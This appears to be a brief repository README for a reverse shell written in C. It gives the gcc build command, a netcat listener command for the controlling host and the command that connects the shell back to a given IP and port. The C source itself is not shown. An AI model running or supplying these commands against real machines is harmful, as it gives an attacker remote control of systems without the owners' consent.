# Simple Reverse Shell
A run of the mill reverse shell written in C.

## Building
```
gcc -o reverse-shell reverse-shell.c
```

## Using
**Host machine (With netcat)**
```
nc -l -p 1337
```

**Client machine:**
```
./reverse-shell <ip> 1337
```
